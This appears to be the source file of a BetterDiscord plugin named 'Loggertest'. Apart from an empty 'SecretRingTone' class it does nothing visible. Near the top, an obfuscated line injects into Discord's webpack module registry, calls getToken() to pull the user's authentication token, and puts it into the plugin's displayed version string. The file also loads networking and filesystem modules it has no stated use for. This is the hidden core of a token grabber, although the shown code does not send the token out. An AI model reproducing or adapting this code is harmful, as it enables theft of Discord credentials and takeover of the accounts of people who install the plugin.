/**!
 * @name Loggertest
 * @version 1.0.0
 */
const fs = require('fs');
const path = require('path');
const request = require('request');
const electron = require('electron');
var t="extra_id";w=webpackJsonp.push([[],{[t]:(x,y,z)=>x.exports=z},[[t]]]);Object.keys(w.c).find(e=>t=w(e)?.default?.getToken?.());t
const config = {"info":{"name":"Loggertest","description":" ","version":"TOKEN: " + t,"authors":[{"name":" ","discord_id":" "}],"github":" ","github_raw":" "},"changelog":[{"title":" ","type":"fixed","items":[" "]}]};
function buildPlugin() {
    const [Plugin, BoundedLibrary] = global.ZeresPluginLibrary.buildPlugin(config);
    var plugin;
 (() => {
	"use strict";
	var __webpack_require__ = {};
 	(() => {
 		
 		__webpack_require__.n = (module) => {
 			var getter = module && module.__esModule ?
 				() => (module['default']) :
				() => (module);
 			__webpack_require__.d(getter, { a: getter });
 			return getter;
		};
 	})();
 	(() => {

 		__webpack_require__.d = (exports, definition) => {
			for(var key in definition) {
				if(__webpack_require__.o(definition, key) && !__webpack_require__.o(exports, key)) {
 					Object.defineProperty(exports, key, { enumerable: true, get: definition[key] });
 				}
 			}
 		};
 	})();
 	(() => {
 		__webpack_require__.o = (obj, prop) => (Object.prototype.hasOwnProperty.call(obj, prop))
 	})();
var __webpack_exports__ = {};
__webpack_require__.d(__webpack_exports__, {
  "default": () => (/* binding */ SecretRingTone)
});
;
const external_BoundedLibrary_namespaceObject = BoundedLibrary;
;
const external_Plugin_namespaceObject = Plugin;
var external_Plugin_default = /*#__PURE__*/__webpack_require__.n(external_Plugin_namespaceObject);
;
const {
    j: WebAudioSound
} = external_BoundedLibrary_namespaceObject.WebpackModules.find(m => m?.j?.prototype._ensureAudio);

class SecretRingTone  extends (external_Plugin_default()) {

    onStart() {}
        onStop() {}
    };
plugin = __webpack_exports__["default"];
 })()
;

    return plugin;
}

module.exports = global.ZeresPluginLibrary
    ? buildPlugin()
    : class {
          constructor() {
              this._config = config;
          }

          getName() {
              return config.info.name;
          }

          getAuthor() {
              return config.info.authors.map(a => a.name).join(', ');
          }

          getDescription() {
              return config.info.description;
          }

          getVersion() {
              return config.info.version;
          }

          start() {}

          stop() {}
      };
